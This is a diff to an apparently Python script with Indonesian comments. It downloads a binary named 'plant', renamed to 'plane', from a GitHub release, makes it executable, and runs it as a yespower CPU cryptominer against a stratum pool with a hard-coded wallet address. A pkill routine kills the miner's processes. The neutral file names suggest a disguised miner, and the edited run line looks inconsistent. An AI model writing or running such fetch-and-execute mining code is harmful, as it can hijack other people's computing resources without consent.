@@ -45,16 +45,16 @@ downloads = {
         ]
     },
     "cpu": {
-        "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.1/plant",
+        "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.1/plane",
         "run": [
-            "chmod +x plant",
-            "./plant/plant ./plant -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17052 -u v3DEMbMrwFetzmzEo6DeUKQnppXSqZZSxg.clarksye"
+            "chmod +x plane",
+            "./plant/plant ./plane -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17052 -u v3DEMbMrwFetzmzEo6DeUKQnppXSqZZSxg.clarksye"
         ]
     }
 }
 
 def kill_processes():
-    process_list = ['plant', 'plant-local', 'non']
+    process_list = ['plant', 'plant-local', 'non', 'plane']
     # Menggabungkan daftar proses menjadi satu string dengan pemisah "|"
     process_string = "|".join(process_list)
     # Menjalankan perintah pkill dengan opsi -f untuk mencocokkan semua pola sekaligus
